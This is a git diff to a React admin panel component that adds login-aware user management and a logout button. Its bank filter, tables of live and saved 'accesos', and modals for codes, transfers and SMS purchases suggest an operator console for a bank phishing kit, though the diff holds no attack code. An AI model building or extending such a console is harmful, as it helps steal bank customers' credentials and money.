@@ -4,16 +4,21 @@ import { queryClient } from '@/lib/queryClient';
 import { apiRequest } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
 import { useWebSocket } from '@/hooks/useWebSocket';
+import { useAuth } from '@/hooks/use-auth';
 import Sidebar from '@/components/admin/Sidebar';
 import AccessTable from '@/components/admin/AccessTable';
+import UserManagement from '@/components/admin/UserManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { Session, ScreenType } from '@shared/schema';
+import { Button } from '@/components/ui/button';
+import { LogOut, UserCog } from 'lucide-react';
 import { nanoid } from 'nanoid';
 
 export default function AdminPanel() {
   const { toast } = useToast();
   const [activeBank, setActiveBank] = useState<string>("todos");
-  const [activeTab, setActiveTab] = useState<'current' | 'saved'>('current');
+  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users'>('current');
+  const { user, logoutMutation } = useAuth();
   const [activeModal, setActiveModal] = useState<string | null>(null);
   const [clientLink, setClientLink] = useState<string>('');
   const [clientCode, setClientCode] = useState<string>('');
@@ -536,33 +541,64 @@ export default function AdminPanel() {
         </div>
 
         {/* Tabs */}
-        <div className="mx-6 mt-6 flex space-x-4">
-          <div 
-            className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
-              ? 'border-[#00aaff] text-[#00aaff]' 
-              : 'border-transparent hover:text-gray-300'}`}
-            onClick={() => setActiveTab('current')}
-          >
-            Accesos actuales
+        <div className="mx-6 mt-6 flex justify-between items-center">
+          <div className="flex space-x-4">
+            <div 
+              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'current' 
+                ? 'border-[#00aaff] text-[#00aaff]' 
+                : 'border-transparent hover:text-gray-300'}`}
+              onClick={() => setActiveTab('current')}
+            >
+              Accesos actuales
+            </div>
+            <div 
+              className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
+                ? 'border-[#00aaff] text-[#00aaff]' 
+                : 'border-transparent hover:text-gray-300'}`}
+              onClick={() => setActiveTab('saved')}
+            >
+              Accesos guardados
+            </div>
+            {user?.role === 'admin' && (
+              <div 
+                className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'users' 
+                  ? 'border-[#00aaff] text-[#00aaff]' 
+                  : 'border-transparent hover:text-gray-300'}`}
+                onClick={() => setActiveTab('users')}
+              >
+                Usuarios
+              </div>
+            )}
           </div>
-          <div 
-            className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'saved' 
-              ? 'border-[#00aaff] text-[#00aaff]' 
-              : 'border-transparent hover:text-gray-300'}`}
-            onClick={() => setActiveTab('saved')}
-          >
-            Accesos guardados
+          
+          <div className="flex items-center space-x-2">
+            <span className="text-gray-400 text-sm mr-2">
+              {user?.username} ({user?.role})
+            </span>
+            <Button 
+              variant="outline" 
+              size="sm"
+              className="text-gray-300 hover:text-white"
+              onClick={() => logoutMutation.mutate()}
+            >
+              <LogOut className="h-4 w-4 mr-1" />
+              Cerrar sesión
+            </Button>
           </div>
         </div>
 
-        {/* Table */}
-        <AccessTable 
-          sessions={sessions}
-          activeBank={activeBank}
-          selectedSessionId={selectedSessionId}
-          onSelectSession={selectSession}
-          isLoading={isLoading}
-        />
+        {/* Content based on active tab */}
+        {activeTab === 'users' ? (
+          <UserManagement />
+        ) : (
+          <AccessTable 
+            sessions={sessions}
+            activeBank={activeBank}
+            selectedSessionId={selectedSessionId}
+            onSelectSession={selectSession}
+            isLoading={isLoading}
+          />
+        )}
       </div>
 
       {/* Modals */}
